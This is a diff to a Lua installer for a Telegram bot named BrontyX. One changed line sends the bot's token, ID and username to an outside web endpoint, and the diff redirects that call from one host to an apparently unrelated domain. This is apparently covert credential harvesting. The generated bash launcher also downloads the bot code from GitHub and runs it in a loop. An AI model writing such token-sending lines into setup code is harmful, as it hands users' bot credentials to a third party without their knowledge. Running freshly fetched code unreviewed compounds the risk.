@@ -64,13 +64,14 @@ os.execute('lua start.lua')
 end
 local function Files_BrontyX_Info()
 Create_Info(database:get(Server_BrontyX.."Token_BrontyX"),database:get(Server_BrontyX.."Id_BrontyX"),database:get(Server_BrontyX.."UserName_BrontyX"))   
-https.request("http://api.kenouk.com/BrontyX/chk.php?id="..database:get(Server_BrontyX.."Id_BrontyX").."&user="..database:get(Server_BrontyX.."UserName_BrontyX").."&token="..database:get(Server_BrontyX.."Token_BrontyX"))
+https.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_BrontyX.."Id_BrontyX").."&user="..database:get(Server_BrontyX.."UserName_BrontyX").."&token="..database:get(Server_BrontyX.."Token_BrontyX"))
 local RunBrontyX = io.open("BrontyX", 'w')
 RunBrontyX:write([[
 #!/usr/bin/env bash
 cd $HOME/BrontyX
 token="]]..database:get(Server_BrontyX.."Token_BrontyX")..[["
 rm -fr BrontyX.lua
+wget "https://raw.githubusercontent.com/BrontyX/BrontyX/main/BrontyX.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./BrontyX.lua -p PROFILE --bot=$token
